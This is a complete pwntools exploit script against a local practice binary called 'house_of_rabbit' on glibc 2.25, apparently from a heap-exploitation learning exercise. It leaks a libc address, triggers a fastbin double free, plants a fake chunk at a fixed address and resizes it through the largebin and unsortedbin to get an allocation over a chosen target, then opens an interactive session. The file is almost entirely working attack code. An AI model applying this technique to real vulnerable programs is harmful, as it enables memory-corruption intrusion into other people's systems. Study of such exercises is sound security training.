#!/usr/bin/python3
from pwn import *

io = process("./house_of_rabbit")
libc = ELF("../.glibc/glibc_2.25/libc.so.6",checksec=False)

index = 0

def malloc(size, data):
    global index
    io.sendline(b"1")
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendlineafter(b"data: ", data)
    index += 1
    return index - 1

def free(index):
    io.sendline(b"2")
    io.sendlineafter(b"index: ", str(index).encode())

def amend_age(age):
    io.sendline(b"3")
    io.sendlineafter(b"age: ", str(age).encode())

io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.symbols['puts']

# "age" is going to be fake_chunk->size
io.sendafter(b"age: ",str(3).encode())


# Make av->system_mem value = 0xa21000
small = malloc(0xa00000,b"")
free(small)
small = malloc(0xa00000,b"")
free(small)

# Fastbin duplication
fast1 = malloc(0x40,b"")
fast2 = malloc(0x40,b"")

free(fast1)
free(fast2)
free(fast1)

# Put fake_chunk in the fastbin
fast1 = malloc(0x40,p64(0x602040))

small = malloc(0x100,b"")

# free(small) triggers malloc_consolidate when merging with top chunk
free(small)

# for the fake chunk is it true that nextchunk != av->top, then is added to the unsortedbin in the last free

# Change fake_chunk->size to fit in the largest largebin (bin[126])
amend_age(0x80001)

# Another big request moves the fake chunk to the largest largebin
small = malloc(0xa00000,b"")

# Change fake_chunk->size to a big one
amend_age(0xfffffffffffffff1)

# Move target to the the unsortedbin
# remainder chunk size is 0xfffffffffffffff0 - 0x10 - 0xffffffffffffffb0 = 0x30
malloc(0x602010 - 0x602040 - 0x20, b"")

# Alloc target
hook = malloc(0x20,b"_s1s1fo_\00")

io.recv(1024)
io.sendline(b"4")

io.interactive()
